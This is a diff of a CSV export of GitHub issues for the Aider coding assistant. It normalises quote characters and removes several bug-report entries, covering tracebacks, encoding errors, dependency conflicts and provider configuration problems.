@@ -391,9 +391,9 @@ AttributeError: 'tree_sitter.Query' object has no attribute 'captures'
 ```","","2026-01-06T02:11:36Z"
 "Aider-AI/aider","2026 Jan-Jul","3787462275","4751","Thoughts and questions about the future direction of aider","Hi Paul,
 
-I hope you’re doing well.
+I hope you're doing well.
 
-I’ve been using aider for almost a year now, and it has become a core part of my daily development workflow. I’ve also explored other tools such as Claude Code, Codex, and Antigravity. Each of them has its own strengths and new ideas, and I’m sure there is a lot for me to learn from their newer features and approaches (for example, skills and other emerging capabilities).
+I've been using aider for almost a year now, and it has become a core part of my daily development workflow. I've also explored other tools such as Claude Code, Codex, and Antigravity. Each of them has its own strengths and new ideas, and I'm sure there is a lot for me to learn from their newer features and approaches (for example, skills and other emerging capabilities).
 
 That said, due to familiarity and the way aider fits my current workflow, I still find myself relying on it most of the time. Its design philosophy and interaction model align very naturally with how I think and work, which is something I really value.
 
@@ -405,7 +405,7 @@ Recently, I noticed that the pace of updates and releases seems a bit slower tha
 
 - Are there areas where the community could help more?
 
-This is not a complaint at all—just genuine curiosity and support from a long-time user who truly appreciates what you’ve built. I’m grateful for the work you’ve put into aider and very interested in where it may go next.
+This is not a complaint at all-just genuine curiosity and support from a long-time user who truly appreciates what you've built. I'm grateful for the work you've put into aider and very interested in where it may go next.
 
 Thank you again for your time and for creating such a great tool.
 
@@ -865,7 +865,7 @@ ValueError: Unknown scheme for proxy URL URL('socks://127.0.0.1:2080/')
 ```","","2026-01-12T11:05:24Z"
 "Aider-AI/aider","2026 Jan-Jul","3806317978","4764","Ollama backend does not forward num_ctx, causing repeated model reloads with large contexts","### Issue
 
-The Ollama backend does not forward the `num_ctx` option to Ollama’s `/api/chat`
+The Ollama backend does not forward the `num_ctx` option to Ollama's `/api/chat`
 endpoint. As a result, Ollama allocates a default (small) KV cache initially and
 must repeatedly unload and reload the model as the context grows.
 
@@ -897,67 +897,6 @@ loaded across subsequent requests.
 ### Version and model info
 
 Aider 0.86.1","","2026-01-12T23:13:25Z"
-"Aider-AI/aider","2026 Jan-Jul","3806648996","4765","win11 has encoding error!","分析一下netapp.c
-   Traceback (most recent call last):
-  File
-""C:\Users\DELL\AppData\Roaming\uv\tools\aider-chat\Lib\site-packages\aider\code
-rs\base_coder.py"", line 1459, in send_message
-    yield from self.send(messages, functions=self.functions)
-  File
-""C:\Users\DELL\AppData\Roaming\uv\tools\aider-chat\Lib\site-packages\aider\code
-rs\base_coder.py"", line 1806, in send
-    yield from self.show_send_output_stream(completion)
-  File
-""C:\Users\DELL\AppData\Roaming\uv\tools\aider-chat\Lib\site-packages\aider\code
-rs\base_coder.py"", line 1959, in show_send_output_stream
-    self.live_incremental_response(False)
-  File
-""C:\Users\DELL\AppData\Roaming\uv\tools\aider-chat\Lib\site-packages\aider\code
-rs\base_coder.py"", line 1981, in live_incremental_response
-    self.mdstream.update(show_resp, final=final)
-  File
-""C:\Users\DELL\AppData\Roaming\uv\tools\aider-chat\Lib\site-packages\aider\mdst
-ream.py"", line 207, in update
-    self.live.console.print(show) # to the console above the live area
-    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File
-""C:\Users\DELL\AppData\Roaming\uv\tools\aider-chat\Lib\site-packages\rich\conso
-le.py"", line 1697, in print
-    with self:
-         ^^^^
-  File
-""C:\Users\DELL\AppData\Roaming\uv\tools\aider-chat\Lib\site-packages\rich\conso
-le.py"", line 870, in __exit__
-    self._exit_buffer()
-  File
-""C:\Users\DELL\AppData\Roaming\uv\tools\aider-chat\Lib\site-packages\rich\conso
-le.py"", line 826, in _exit_buffer
-    self._check_buffer()
-  File
-""C:\Users\DELL\AppData\Roaming\uv\tools\aider-chat\Lib\site-packages\rich\conso
-le.py"", line 2038, in _check_buffer
-    self._write_buffer()
-  File
-""C:\Users\DELL\AppData\Roaming\uv\tools\aider-chat\Lib\site-packages\rich\conso
-le.py"", line 2074, in _write_buffer
-    legacy_windows_render(buffer, LegacyWindowsTerm(self.file))
-  File
-""C:\Users\DELL\AppData\Roaming\uv\tools\aider-chat\Lib\site-packages\rich\_wind
-ows_renderer.py"", line 17, in legacy_windows_render
-    term.write_styled(text, style)
-  File
-""C:\Users\DELL\AppData\Roaming\uv\tools\aider-chat\Lib\site-packages\rich\_win3
-2_console.py"", line 441, in write_styled
-    self.write_text(text)
-  File
-""C:\Users\DELL\AppData\Roaming\uv\tools\aider-chat\Lib\site-packages\rich\_win3
-2_console.py"", line 402, in write_text
-    self.write(text)
-UnicodeEncodeError: 'gbk' codec can't encode character '\u2022' in position 1:
-illegal multibyte sequence
-'gbk' codec can't encode character '\u2022' in position 1: illegal multibyte
-sequence
-  How can i solve this problem! Can you give me some advices？ Thanks !","","2026-01-13T01:19:52Z"
 "Aider-AI/aider","2026 Jan-Jul","3809866604","4769","Uncaught ValueError in exceptions.py line 66","Aider version: 0.86.1
 Python version: 3.11.14
 Platform: FreeBSD-15.0-RELEASE-amd64-64bit-ELF
@@ -1710,43 +1649,6 @@ Traceback (most recent call last):
 ValueError: BadGatewayError is in litellm but not in aider's exceptions list
 
 ```","","2026-01-25T01:39:58Z"
-"Aider-AI/aider","2026 Jan-Jul","3852654773","4797","enable z.ai GLM 4.7 with aider","### Issue
-
-Hello
-How are you? 
-
-Trying to use aider with GLM 4.7 or the flash but I get this error msg.
-
-I do see it listed in models do, so not sure what it needs.
-
-
-
-```
-
-aider --model zai/glm-4.7
-──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-Aider v0.86.1
-Model: zai/glm-4.7 with whole edit format
-Git repo: .git with 862 files
-Repo-map: using 4096 tokens, auto refresh
-Added README.md to the chat (read-only).
-──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-Readonly: README.md                                                                                                   
-> hello                                                                                                               
-
-
-litellm.BadRequestError: LLM Provider NOT provided. Pass in the LLM provider you are trying to call. You passed 
-model=zai/glm-4.7
- Pass model as E.g. For 'Huggingface' inference endpoints pass in `completion(model='huggingface/starcoder',..)` Learn
-more: https://docs.litellm.ai/docs/providers
-
-https://docs.litellm.ai/docs/providers
-Open URL for more info? (Y)es/(N)o/(D)on't ask again [Yes]:                         
-```
-
-### Version and model info
-
-_No response_","","2026-01-25T06:04:48Z"
 "Aider-AI/aider","2026 Jan-Jul","3853265983","4798","Aider is not using the .aider.model.settings.yml file and seems to take the user's configuration as the default.","Aider is not using the .aider.model.settings.yml file and seems to take the user's configuration as the default.
 
 ```console
@@ -1870,285 +1772,6 @@ Screenpipe captures all of this. Aider could use it to:
 Both tools are **local-first** - no data leaves your machine!
 
 Would love to discuss feasibility.","","2026-01-25T15:48:34Z"
-"Aider-AI/aider","2026 Jan-Jul","3856960162","4801","Dependency failure attempting to install langchain-community","When attempting to install `langchain-community` with `aider-chat` v.0.86.1, I receive the following error:
-
-```
-❯ uv add langchain-community
-  × No solution found when resolving dependencies for split (python_full_version >= '3.13'):
-  ╰─▶ Because ai-devtools:dev depends on aider-chat>=0.86.1 and only aider-chat<=0.86.1 is available, we can conclude that ai-devtools:dev depends
-      on aider-chat==0.86.1.
-      And because aider-chat==0.86.1 depends on requests==2.32.4, we can conclude that ai-devtools:dev depends on requests==2.32.4.
-      And because langchain-community>=0.3.28 depends on requests>=2.32.5 and langchain-community==0.2.14 was yanked (reason: Overly restrictive
-      langchain-core dependency. Fixed in 0.2.15), we can conclude that all of:
-          langchain-community==0.2.14
-          langchain-community>=0.3.28
-       and ai-devtools:dev are incompatible. (1)
-
-      Because only the following versions of langchain-community are available:
-          langchain-community==0.0.1
-          langchain-community==0.0.2
-          langchain-community==0.0.3
-          langchain-community==0.0.4
-          langchain-community==0.0.5
-          langchain-community==0.0.6
-          langchain-community==0.0.7
-          langchain-community==0.0.8
-          langchain-community==0.0.9
-          langchain-community==0.0.10
-          langchain-community==0.0.11
-          langchain-community==0.0.12
-          langchain-community==0.0.13
-          langchain-community==0.0.14
-          langchain-community==0.0.15
-          langchain-community==0.0.16
-          langchain-community==0.0.17
-          langchain-community==0.0.18
-          langchain-community==0.0.19
-          langchain-community==0.0.20
-          langchain-community==0.0.21
-          langchain-community==0.0.22
-          langchain-community==0.0.23
-          langchain-community==0.0.24
-          langchain-community==0.0.25
-          langchain-community==0.0.26
-          langchain-community==0.0.27
-          langchain-community==0.0.28
-          langchain-community==0.0.29
-          langchain-community==0.0.30
-          langchain-community==0.0.31
-          langchain-community==0.0.32
-          langchain-community==0.0.33
-          langchain-community==0.0.34
-          langchain-community==0.0.35
-          langchain-community==0.0.36
-          langchain-community==0.0.37
-          langchain-community==0.0.38
-          langchain-community==0.2.0
-          langchain-community==0.2.1
-          langchain-community==0.2.2
-          langchain-community==0.2.3
-          langchain-community==0.2.4
-          langchain-community==0.2.5
-          langchain-community==0.2.6
-          langchain-community==0.2.7
-          langchain-community==0.2.9
-          langchain-community==0.2.10
-          langchain-community==0.2.11
-          langchain-community==0.2.12
-          langchain-community==0.2.13
-          langchain-community==0.2.14
-          langchain-community==0.2.15
-          langchain-community==0.2.16
-          langchain-community==0.2.17
-          langchain-community==0.2.18
-          langchain-community==0.2.19
-          langchain-community==0.3.0
-          langchain-community==0.3.1
-          langchain-community==0.3.2
-          langchain-community==0.3.3
-          langchain-community==0.3.4
-          langchain-community==0.3.5
-          langchain-community==0.3.6
-          langchain-community==0.3.7
-          langchain-community==0.3.8
-          langchain-community==0.3.9
-          langchain-community==0.3.10
-          langchain-community==0.3.11
-          langchain-community==0.3.12
-          langchain-community==0.3.13
-          langchain-community==0.3.14
-          langchain-community==0.3.15
-          langchain-community==0.3.16
-          langchain-community==0.3.17
-          langchain-community==0.3.18
-          langchain-community==0.3.19
-          langchain-community==0.3.20
-          langchain-community==0.3.21
-          langchain-community==0.3.22
-          langchain-community==0.3.23
-          langchain-community==0.3.24
-          langchain-community==0.3.25
-          langchain-community==0.3.26
-          langchain-community==0.3.27
-          langchain-community==0.3.28
-          langchain-community==0.3.29
-          langchain-community==0.3.30
-          langchain-community==0.3.31
-          langchain-community==0.4
-          langchain-community==0.4.1
-      and langchain-community==0.0.1 depends on langchain-core>=0.0.13,<0.1, we can conclude that langchain-community<0.0.2 depends on
-      langchain-core>=0.0.13,<0.1.
-      And because langchain-community>=0.0.2,<=0.0.7 depends on langchain-core>=0.1,<0.2 and langchain-core>=0.1.5,<0.2, we can conclude that
-      langchain-community<0.0.9 depends on one of:
-          langchain-core>=0.0.13,<0.1
-          langchain-core>=0.1,<0.2
-
-      And because langchain-community==0.0.9 was yanked (reason: bad imports from langchain-core) and langchain-community>=0.0.10,<=0.0.11 depends
-      on langchain-core>=0.1.8,<0.2, we can conclude that langchain-community<0.0.12 depends on one of:
-          langchain-core>=0.0.13,<0.1
-          langchain-core>=0.1,<0.2
-
-      And because langchain-community>=0.0.12,<=0.0.13 depends on langchain-core>=0.1.9,<0.2 and langchain-core>=0.1.14,<0.2, we can conclude that
-      langchain-community<0.0.16 depends on one of:
-          langchain-core>=0.0.13,<0.1
-          langchain-core>=0.1,<0.2
-
-      And because langchain-community>=0.0.16,<=0.0.17 depends on langchain-core>=0.1.16,<0.2 and langchain-core>=0.1.19,<0.2, we can conclude that
-      langchain-community<0.0.19 depends on one of:
-          langchain-core>=0.0.13,<0.1
-          langchain-core>=0.1,<0.2
-
-      And because langchain-community>=0.0.19,<=0.0.20 depends on langchain-core>=0.1.21,<0.2 and langchain-core>=0.1.24,<0.2, we can conclude that
-      langchain-community<0.0.22 depends on one of:
-          langchain-core>=0.0.13,<0.1
-          langchain-core>=0.1,<0.2
-
-      And because langchain-community>=0.0.22,<=0.0.24 depends on langchain-core>=0.1.26,<0.2 and langchain-core>=0.1.28,<0.2.0, we can conclude
-      that langchain-community<0.0.26 depends on one of:
-          langchain-core>=0.0.13,<0.1
-          langchain-core>=0.1,<0.2.0
-
-      And because langchain-community==0.0.26 depends on langchain-core>=0.1.29,<0.2.0 and langchain-core>=0.1.30,<0.2.0, we can conclude that
-      langchain-community<0.0.28 depends on one of:
-          langchain-core>=0.0.13,<0.1
-          langchain-core>=0.1,<0.2.0
-
-      And because langchain-community==0.0.28 depends on langchain-core>=0.1.31,<0.2.0 and langchain-core>=0.1.33,<0.2.0, we can conclude that
-      langchain-community<0.0.30 depends on one of:
-          langchain-core>=0.0.13,<0.1
-          langchain-core>=0.1,<0.2.0
-
-      And because langchain-community>=0.0.30,<=0.0.31 depends on langchain-core>=0.1.37,<0.2.0 and langchain-core>=0.1.41,<0.2.0, we can conclude
-      that langchain-community<0.0.33 depends on one of:
-          langchain-core>=0.0.13,<0.1
-          langchain-core>=0.1,<0.2.0
-
-      And because langchain-community==0.0.33 depends on langchain-core>=0.1.43,<0.2.0 and langchain-core>=0.1.45,<0.2.0, we can conclude that
-      langchain-community<0.0.35 depends on one of:
-          langchain-core>=0.0.13,<0.1
-          langchain-core>=0.1,<0.2.0
-
-      And because langchain-community==0.0.35 depends on langchain-core>=0.1.47,<0.2.0 and langchain-core>=0.1.48,<0.2.0, we can conclude that
-      langchain-community<0.0.37 depends on one of:
-          langchain-core>=0.0.13,<0.1
-          langchain-core>=0.1,<0.2.0
-
-      And because langchain-community==0.0.37 depends on langchain-core>=0.1.51,<0.2.0 and langchain-core>=0.1.52,<0.2.0, we can conclude that
-      langchain-community<0.2.0 depends on one of:
-          langchain-core>=0.0.13,<0.1
-          langchain-core>=0.1,<0.2.0
-
-      And because langchain==1.2.7 depends on langchain-core>=1.2.7,<2.0.0 and langchain-community>=0.3.26,<=0.3.27 depends on
-      langchain>=0.3.26,<1.0.0, we can conclude that langchain==1.2.7 and all of:
-          langchain-community<0.2.0
-          langchain-community>0.3.25,<0.3.28
-       are incompatible.
-      And because langchain-community>=0.3.24,<=0.3.25 depends on langchain>=0.3.25,<1.0.0 and langchain>=0.3.24,<1.0.0, we can conclude that
-      langchain==1.2.7 and all of:
-          langchain-community<0.2.0
-          langchain-community>0.3.21,<0.3.28
-       are incompatible.
-      And because langchain-community==0.3.21 depends on langchain>=0.3.23,<1.0.0 and langchain>=0.3.21,<1.0.0, we can conclude that
-      langchain==1.2.7 and all of:
-          langchain-community<0.2.0
-          langchain-community>0.3.19,<0.3.28
-       are incompatible.
-      And because langchain-community==0.3.19 depends on langchain>=0.3.20,<1.0.0 and langchain>=0.3.19,<1.0.0, we can conclude that
-      langchain==1.2.7 and all of:
-          langchain-community<0.2.0
-          langchain-community>0.3.17,<0.3.28
-       are incompatible.
-      And because langchain-community==0.3.17 depends on langchain>=0.3.18,<1.0.0 and langchain>=0.3.16,<0.4.0, we can conclude that
-      langchain==1.2.7 and all of:
-          langchain-community<0.2.0
-          langchain-community>0.3.15,<0.3.28
-       are incompatible.
-      And because langchain-community==0.3.15 depends on langchain>=0.3.15,<0.4.0 and langchain>=0.3.14,<0.4.0, we can conclude that
-      langchain==1.2.7 and all of:
-          langchain-community<0.2.0
-          langchain-community>0.3.13,<0.3.28
-       are incompatible.
-      And because langchain-community==0.3.13 depends on langchain>=0.3.13,<0.4.0 and langchain>=0.3.12,<0.4.0, we can conclude that
-      langchain==1.2.7 and all of:
-          langchain-community<0.2.0
-          langchain-community>0.3.11,<0.3.28
-       are incompatible.
-      And because langchain-community==0.3.11 depends on langchain>=0.3.11,<0.4.0 and langchain>=0.3.10,<0.4.0, we can conclude that
-      langchain==1.2.7 and all of:
-          langchain-community<0.2.0
-          langchain-community>0.3.9,<0.3.28
-       are incompatible.
-      And because langchain-community>=0.3.8,<=0.3.9 depends on langchain>=0.3.8,<0.4.0 and langchain>=0.3.7,<0.4.0, we can conclude that
-      langchain==1.2.7 and all of:
-          langchain-community<0.2.0
-          langchain-community>0.3.5,<0.3.28
-       are incompatible.
-      And because langchain-community>=0.3.4,<=0.3.5 depends on langchain>=0.3.6,<0.4.0 and langchain>=0.3.4,<0.4.0, we can conclude that
-      langchain==1.2.7 and all of:
-          langchain-community<0.2.0
-          langchain-community>0.3.2,<0.3.28
-       are incompatible.
-      And because langchain-community==0.3.2 depends on langchain>=0.3.3,<0.4.0 and langchain>=0.3.1,<0.4.0, we can conclude that langchain==1.2.7
-      and all of:
-          langchain-community<0.2.0
-          langchain-community>0.3.0,<0.3.28
-       are incompatible.
-      And because langchain-community==0.3.0 depends on langchain>=0.3.0,<0.4.0 and langchain>=0.2.17,<0.3.0, we can conclude that langchain==1.2.7
-      and all of:
-          langchain-community<0.2.0
-          langchain-community>0.2.17,<0.3.28
-       are incompatible.
-      And because langchain-community>=0.2.16,<=0.2.17 depends on langchain>=0.2.16,<0.3.0 and langchain>=0.2.15,<0.3.0, we can conclude that
-      langchain==1.2.7 and all of:
-          langchain-community<0.2.0
-          langchain-community>0.2.12,<0.2.14
-          langchain-community>0.2.14,<0.3.28
-       are incompatible.
-      And because langchain-community==0.2.12 depends on langchain>=0.2.13,<0.3.0 and langchain>=0.2.12,<0.3.0, we can conclude that
-      langchain==1.2.7 and all of:
-          langchain-community<0.2.0
-          langchain-community>0.2.10,<0.2.14
-          langchain-community>0.2.14,<0.3.28
-       are incompatible.
-      And because langchain-community>=0.2.9,<=0.2.10 depends on langchain>=0.2.9,<0.3.0 and langchain>=0.2.7,<0.3.0, we can conclude that
-      langchain==1.2.7 and all of:
-          langchain-community<0.2.0
-          langchain-community>0.2.6,<0.2.14
-          langchain-community>0.2.14,<0.3.28
-       are incompatible.
-      And because langchain-community==0.2.6 depends on langchain>=0.2.6,<0.3.0 and langchain>=0.2.5,<0.3.0, we can conclude that langchain==1.2.7
-      and all of:
-          langchain-community<0.2.0
-          langchain-community>0.2.4,<0.2.14
-          langchain-community>0.2.14,<0.3.28
-       are incompatible.
-      And because langchain-community>=0.2.0,<=0.2.4 depends on langchain>=0.2.0,<0.3.0 and only langchain<=1.2.7 is available, we can conclude
-      that langchain>=1.2.7 and all of:
-          langchain-community<0.2.14
-          langchain-community>0.2.14,<0.3.28
-       are incompatible.
-      And because your project depends on langchain>=1.2.7 and langchain-community, we can conclude that your project depends on one of:
-          langchain-community==0.2.14
-          langchain-community>=0.3.28
-
-      And because we know from (1) that all of:
-          langchain-community==0.2.14
-          langchain-community>=0.3.28
-       and ai-devtools:dev are incompatible, we can conclude that your project and ai-devtools:dev are incompatible.
-      And because your project requires your project and ai-devtools:dev, we can conclude that your project's requirements are unsatisfiable.
-
-      hint: Pre-releases are available for `langchain-community` in the requested range (e.g., 1.0.0a1), but pre-releases weren't enabled (try:
-      `--prerelease=allow`)
-  help: If you want to add the package regardless of the failed resolution, provide the `--frozen` flag to skip locking and syncing.
-```
-
-I've tried the usual things, like `--frozen`, and `--prerelease=allow`, but those only led to more errors.
-
-I also tried cloning `main`, and referencing it, but also received dependency errors.
-
-Am I doing something wrong?
-
-Any help is appreciated.","","2026-01-26T17:42:27Z"
 "Aider-AI/aider","2026 Jan-Jul","3858037417","4802","Uncaught ValueError in exceptions.py line 66","Aider version: 0.86.1
 Python version: 3.12.8
 Platform: Windows-11-10.0.26100-SP0
@@ -2204,61 +1827,6 @@ Traceback (most recent call last):
 AttributeError: 'int' object has no attribute 'get_input'
 
 ```","","2026-01-28T07:16:37Z"
-"Aider-AI/aider","2026 Jan-Jul","3882468833","4805","Uncaught KeyError in _file_info.py line 112","Aider version: 0.86.1
-Python version: 3.12.8
-Platform: Linux-6.18.5+kali-amd64-x86_64-with-glibc2.42
-Python implementation: CPython
-Virtual environment: Yes
-OS: Linux 6.18.5+kali-amd64 (64bit)
-Git version: git version 2.51.0
-
-An uncaught exception occurred:
-
-```
-Traceback (most recent call last):
-  File ""aider"", line 10, in <module>
-    sys.exit(main())
-             ^^^^^^
-  File ""main.py"", line 891, in main
-    problem = models.sanity_check_models(io, main_model)
-              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File ""models.py"", line 1111, in sanity_check_models
-    problem_main = sanity_check_model(io, main_model)
-                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File ""models.py"", line 1150, in sanity_check_model
-    check_for_dependencies(io, model.name)
-  File ""models.py"", line 1183, in check_for_dependencies
-    check_pip_install_extra(
-  File ""utils.py"", line 298, in check_pip_install_extra
-    __import__(module)
-  File ""__init__.py"", line 24, in <module>
-    from google.cloud.aiplatform import initializer
-  File ""initializer.py"", line 35, in <module>
-    from google.cloud.aiplatform import compat
-  File ""__init__.py"", line 18, in <module>
-    from google.cloud.aiplatform.compat import services
-  File ""__init__.py"", line 18, in <module>
-    from google.cloud.aiplatform_v1beta1.services.dataset_service import (
-  File ""__init__.py"", line 31, in <module>
-    from .services.dataset_service import DatasetServiceClient
-  File ""__init__.py"", line 16, in <module>
-    from .client import DatasetServiceClient
-  File ""client.py"", line 66, in <module>
-    from google.cloud.aiplatform_v1beta1.services.dataset_service import pagers
-  File ""pagers.py"", line 40, in <module>
-    from google.cloud.aiplatform_v1beta1.types import annotation
-  File ""__init__.py"", line 1039, in <module>
-    from .notebook_service import (
-  File ""notebook_service.py"", line 895, in <module>
-    class DeleteNotebookExecutionJobRequest(proto.Message):
-  File ""message.py"", line 279, in __new__
-    file_info.generate_file_pb(new_class=cls, fallback_salt=full_name)
-  File ""_file_info.py"", line 112, in generate_file_pb
-    descriptor = pool.FindMessageTypeByName(full_name)
-                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-KeyError: ""Couldn't find message google.cloud.aip�atform.v1beta1.StartNotebookRuntimeOperationMetadata""
-
-```","","2026-02-01T17:05:35Z"
 "Aider-AI/aider","2026 Jan-Jul","3884721479","4806","[Windows] AttributeError in repomap.py - Uncaught AttributeError in repomap.py line 289","Aider version: 0.86.2.dev+less
 Python version: 3.12.9
 Platform: Windows-11-10.0.26100-SP0
@@ -2768,12 +2336,12 @@ git.exc.GitCommandNotFound: Cmd('git') not found due to: FileNotFoundError('[Err
 
 ( git 2.43.5 does exist in this environment. I don't know why it doesn't find it. It is a cluster running Rocky Linux. )","","2026-02-14T22:24:52Z"
 "Aider-AI/aider","2026 Jan-Jul","3942855390","4833","Termux/Android (aarch64) installation guide and pre-built wheels","I've successfully installed aider-chat 0.86.2 on Termux (Android aarch64, Python 3.12) and documented the full process including all fixes. Pre-built wheels available at: https://github.com/skoll43/aider-chat-termux-wheels","","2026-02-15T02:09:16Z"
-"Aider-AI/aider","2026 Jan-Jul","3945503564","4834","Opt-in: publish a minimal, proof-backed ‘verified ship’ entry for Aider v0.86.0?","Hi Aider maintainers —
+"Aider-AI/aider","2026 Jan-Jul","3945503564","4834","Opt-in: publish a minimal, proof-backed 'verified ship' entry for Aider v0.86.0?","Hi Aider maintainers -
 
 I noticed the **v0.86.0** release: 
 https://github.com/Aider-AI/aider/releases/tag/v0.86.0
 
-I help maintain *LittleShips*, an opt-in directory of “verified ships” (short entries that point to a specific tag/commit plus a tiny reproduction/proof bundle). Not asking for endorsement or any marketing — the goal is simply to give users a stable, reproducible reference for a release.
+I help maintain *LittleShips*, an opt-in directory of ""verified ships"" (short entries that point to a specific tag/commit plus a tiny reproduction/proof bundle). Not asking for endorsement or any marketing - the goal is simply to give users a stable, reproducible reference for a release.
 
 **2-minute proof checklist (minimal):**
 - Tag/commit (v0.86.0)
@@ -2781,7 +2349,7 @@ I help maintain *LittleShips*, an opt-in directory of “verified ships” (shor
 - CI/tests link for that tag (Actions link is enough)
 - Optional: link to the changelog/release notes
 
-If you’d like, I can draft the entry for your review and you can tweak/approve. If this isn’t useful, feel free to close and I won’t follow up.","","2026-02-16T02:01:02Z"
+If you'd like, I can draft the entry for your review and you can tweak/approve. If this isn't useful, feel free to close and I won't follow up.","","2026-02-16T02:01:02Z"
 "Aider-AI/aider","2026 Jan-Jul","3946604948","4835","Uncaught ValueError in __init__.py line 248","Aider version: 0.86.1
 Python version: 3.12.3
 Platform: Windows-10-10.0.19045-SP0
@@ -3020,8 +2588,6 @@ Traceback (most recent call last):
 ModuleNotFoundError: No module named 'tiktoken'
 
 ```","","2026-02-18T22:18:55Z"
-"Aider-AI/aider","2026 Jan-Jul","3965295922","4851","Error BadRequest","░litellm.BadRequestError: DeepseekException - {""error"":{""message"":""Insufficient Balance"",""type"":""unknown_error"",""param"":null,""code"":""invalid_request_error""}}
-","","2026-02-19T21:50:07Z"
 "Aider-AI/aider","2026 Jan-Jul","3967577914","4852","Uncaught OSError in _win32_console.py line 403","Aider version: 0.86.3.dev5+gb9050e1d5
 Python version: 3.12.7
 Platform: Windows-11-10.0.26200-SP0
@@ -3196,102 +2762,6 @@ Do you guys know, how can one use a claude code max subscription with aider? tha
 ### Version and model info
 
 _No response_","","2026-02-25T17:00:55Z"
-"Aider-AI/aider","2026 Jan-Jul","3993616950","4859","can't ask question in aider","### Issue
-
-I clone the main branch from this repo, but it has big problems: cat ask question in both /code /ask /architect modes.  error message is : 
-```
-) ✗ aider-nv
-────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-Using deepseek model with API key from environment.
-Aider v0.86.3.dev+import
-Main model: deepseek/deepseek-chat with udiff edit format, prompt cache, infinite output
-Weak model: openai/qwen/qwen3-next-80b-a3b-instruct
-Git repo: .git with 45 files
-Repo-map: using 2048 tokens, files refresh
-Added .aider.md to the chat (read-only).
-Cost estimates may be inaccurate when using streaming and caching.
-────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-Readonly: .aider.md
-udiff> /ask who are you
-
-Unable to complete ask: module 'litellm' has no attribute 'BadGatewayError'    **#(here is the error)**
-────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-RReadonly: .aider.md
-udiff>
-
-
-^C again to exit
-────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-Readonly: .aider.md
-udiff>
-
-
-^C KeyboardInterrupt
-
-) ✗ aider-nv
-────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-Using deepseek model with API key from environment.
-Aider v0.86.3.dev+import
-Main model: deepseek/deepseek-chat with udiff edit format, prompt cache, infinite output
-Weak model: openai/qwen/qwen3-next-80b-a3b-instruct
-Git repo: .git with 45 files
-Repo-map: using 2048 tokens, files refresh
-Added .aider.md to the chat (read-only).
-Cost estimates may be inaccurate when using streaming and caching.
-────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-Readonly: .aider.md
-udiff> 帮我看看这是一个什么项目
-
-
-# Uncaught AttributeError in exceptions.py line 74
-
-Aider version: 0.86.3.dev+import
-Python version: 3.12.12
-Platform: macOS-12.7.6-x86_64-i386-64bit
-Python implementation: CPython
-Virtual environment: Yes
-OS: Darwin 21.6.0 (64bit)
-Git version: git version 2.42.0
-
-An uncaught exception occurred:
-
-
-Traceback (most recent call last):
-  File ""ori-aider"", line 10, in <module>
-    sys.exit(main())
-             ^^^^^^
-  File ""main.py"", line 1162, in main
-    coder.run()
-  File ""base_coder.py"", line 887, in run
-    self.run_one(user_message, preproc)
-  File ""base_coder.py"", line 934, in run_one
-    list(self.send_message(message))
-  File ""base_coder.py"", line 1451, in send_message
-    litellm_ex = LiteLLMExceptions()
-                 ^^^^^^^^^^^^^^^^^^^
-  File ""exceptions.py"", line 60, in __init__
-    self._load()
-  File ""exceptions.py"", line 74, in _load
-    ex = getattr(litellm, var)
-         ^^^^^^^^^^^^^^^^^^^^^
-AttributeError: module 'litellm' has no attribute 'BadGatewayError'
-
-
-
-Please consider reporting this bug to help improve aider!
-      ░^CError in sys.excepthook:eepseek-chat error in your browser? (Y/n)
-...
-```
-
-### Version and model info
-
-Aider version: 0.86.3.dev+import
-Python version: 3.12.12
-Platform: macOS-12.7.6-x86_64-i386-64bit
-Python implementation: CPython
-Virtual environment: Yes
-OS: Darwin 21.6.0 (64bit)
-Git version: git version 2.42.0","","2026-02-26T06:41:14Z"
 "Aider-AI/aider","2026 Jan-Jul","3995099632","4860","Uncaught TypeError in analytics.py line 240","Aider version: 0.86.2
 Python version: 3.11.9
 Platform: Windows-10-10.0.19045-SP0
@@ -3361,95 +2831,6 @@ Traceback (most recent call last):
 git.exc.NoSuchPathError: /mnt/c/Users/wawer/Ubuntu/tutorial
 
 ```","","2026-02-26T20:56:15Z"
-"Aider-AI/aider","2026 Jan-Jul","4002813546","4867","Julia crashes aider","```
-% aider
-────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-No git repo found, create one to track aider's changes (recommended)? (Y)es/(N)o [Yes]: y
-Added .aider* to .gitignore
-Git repository created in /tmp/tmp.jC9R4PveDq
-Aider v0.86.2
-Main model: github_copilot/claude-opus-4.5 with whole edit format
-Weak model: github_copilot/gpt-5-mini
-Git repo: .git with 0 files
-Repo-map: using 4096 tokens, auto refresh
-────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-> Write a simple hello-world in julia
-
-hello.jl
-
-
-println(""Hello, World!"")
-
-
-
-Tokens: 599 sent, 13 received.
-
-hello.jl
-Create new file? (Y)es/(N)o [Yes]:
-Applied edit to hello.jl
-Commit 6ed1050 feat: add Julia hello world script hello.jl
-You can use /undo to undo and discard each aider commit.
-────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-hello.jl
-> What is the Answer to the Ultimate Question of Life, the Universe, and Everything?
-
-Aider version: 0.86.2
-Python version: 3.12.12
-Platform: Linux-6.18.12-gentoo-dist-x86_64-Intel-R-_Core-TM-_i9-10885H_CPU_@_2.40GHz-with-glibc2.42
-Python implementation: CPython
-Virtual environment: Yes
-OS: Linux 6.18.12-gentoo-dist (64bit)
-Git version: git version 2.52.0
-
-An uncaught exception occurred:
-
-Traceback (most recent call last):
-  File ""aider"", line 10, in <module>
-    sys.exit(main())
-             ^^^^^^
-  File ""main.py"", line 1162, in main
-    coder.run()
